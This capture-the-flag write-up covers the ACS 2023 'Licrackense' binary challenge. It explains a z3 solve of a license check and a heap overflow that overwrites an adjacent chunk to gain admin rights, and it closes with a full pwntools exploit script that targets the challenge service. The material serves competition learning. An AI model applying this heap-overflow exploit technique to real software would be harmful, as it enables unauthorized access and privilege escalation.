---
title : "Licrackense [Binary]"
categories: ACS2023
---

Light RE with z3 + heap overflow. From ACS 2023 finals.

# Challenge Description

[prob]({{ site.url }}/files/acs2023/licrackense/prob){: .btn .btn--info}

# Solution

This program is splitted into two parts, the first part is a license key check, which consists of pretty straightforward operations that can be solved using z3.

{% include image.html url="/assets/images/acs2023/licrackense_license_check.png" description="" %}

After passing this check, we are able to execute some commands, but we need to get admin access first. We see that there is a check using `FUN_00101736` that checks the second pointer in `param_1` which we have no input to.

{% include image.html url="/assets/images/acs2023/licrackense_command_handler.png" description="" %}

However, notice that `read(0, *param_1, 0x256)` writes into the first pointer of `param_1`, which is initialized to size of `0x100` only in this function:

{% include image.html url="/assets/images/acs2023/licrackense_pointer_init.png" description="" %}

The second pointer's chunk is right after the first chunk. So, we can overflow into the second chunk and write the required values to get admin permission. To illustrate this:

```
Memory map of the heap

               +-------------------------+
               | chunk header    8 bytes | \
param_1[0] --> +-------------------------+
               | data                    |   chunk 0
               +-------------------------+
               | chunk header    8 bytes | /
               +-------------------------+
               | chunk header    8 bytes | \
param_1[1] --> +-------------------------+
               | data                    |   chunk 1
               +-------------------------+
               | chunk header    8 bytes | /
               +-------------------------+
```

Note that, unlike buffer overflows on the stack, we need to account for the heap chunk header when calculating how much padding to use. See [this article](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/) for a deep dive into these stuffs. We'll have to add an extra 16 bytes to our payload.


{% include image.html url="/assets/images/acs2023/licrackense_admin_check.png" description="Grab the bytes from here" %}

Then, just make sure to put in `/secret/document` at the start of the payload to run the command and `cat` the flag.

# Final Script
```python
from pwn import *
from z3 import *

DEBUG = True

arr = [ 0x35, 0x78, 0xda, 0x89, 0xad, 0x90, 0x34, 0x75, 0x4f, 0x67, 0xfd, 0x89, 0x79, 0xf3, 0x43,
        0x28, 0x9d, 0x67, 0xdf, 0x54, 0xf7, 0x82, 0x11, 0x20, 0xdf, 0x89, 0x34, 0x38, 0x9d, 0x67,
        0x47, 0x89, 0xd8, 0x49,    8, 0xc6, 0xad, 0xf1, 0xc4, 0x10, 0x59,  0xf, 0x73, 0x89, 0xf9,
        0x21, 0xff, 0x57, 0x99, 0x3c, 0x3b, 0xb3, 0x6c, 0xef, 0x96, 0x41, 0x24,  199, 0xfd, 0x44,
        0x44, 0xa5, 0x43, 0x6b, 0x81, 0xc5 ]

s = Solver()

flag = [BitVec(str(i), 8) for i in range(0x21)]
key = arr[:len(flag)]
target = arr[len(flag):]

assert(len(key) <= len(target))

tmp = []
for i in range(len(flag)):
    tmp.append(flag[i])

for i in range(len(flag)):
    tmp[i] = RotateLeft(tmp[i], 2)

for i in range(len(flag)):
    tmp[i] = RotateRight(tmp[i], 4)

for i in range(len(flag) - 1):
    tmp[i] ^= tmp[i+1]

for i in range(len(flag)):
    tmp[i] = RotateRight(tmp[i], 4)

for i in range(len(flag)):
    tmp[i] ^= key[i]

for i in range(len(flag)):
    s.add(tmp[i] == target[i])

assert(s.check() == sat)
key = ""
for ch in flag:
    key += chr(s.model()[ch].as_long())

print("Key:", key)

cmd = [0 for _ in range(0x10)]
cmd[2] = ord('\x0e')
cmd[8] = ord('x')
cmd[10] = ord('\t')
cmd[0xf] = ord('x') 
cmd[4] = ord('v')
cmd[0] = -0x29 
cmd[0xb] = -0x79 
cmd[7] = ord('n')
cmd[5] = ord('T') 
cmd[9] = -0x70 
cmd[6] = ord('5')
cmd[0xe] = ord('V')
cmd[3] = -0x68 
cmd[0xd] = ord('T')
cmd[0xc] = -0x4a
cmd[1] = -0x77
cmd = list(map(lambda x : (x & 0xff).to_bytes(1, 'little'), cmd))
cmd = b"".join(cmd)

payload = b"/secret/document\x00"
payload += b"A" * (0x100 - len(payload)) + b"B" * 0x10 + cmd

conn = process("./prob") if DEBUG else remote("192.168.0.52", 10044)
conn.recvuntil(b": ")

conn.sendline(key.encode())

conn.recvuntil(b"> ")
conn.sendline(payload)

print(conn.recvall())
```
